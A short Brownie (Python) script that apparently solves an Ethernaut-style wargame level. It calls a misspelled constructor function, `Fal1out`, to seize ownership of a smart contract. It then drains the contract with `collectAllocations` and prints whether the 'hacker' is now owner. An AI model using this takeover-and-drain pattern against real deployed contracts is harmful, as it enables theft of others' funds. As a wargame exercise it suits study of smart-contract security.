from brownie import accounts, config, interface, web3

def main():
    contract = "0x4Fb5474a861953eCa48Fec0f38814748a56230FC"
    player = accounts.add(config["wallets"]["from_key"])
    print(player)

    #get fallback contract at address
    fallout=interface.IFallout(contract)

    #call Fallout function
    fallout.Fal1out({'from': player, 'amount': '1'})


    print(f"Owner is hacker: {fallout.owner() == player.address}")

    #call collectAllocations function
    fallout.collectAllocations({"from" : player})
    print(f"Final contract balance: {web3.eth.getBalance(contract)}")

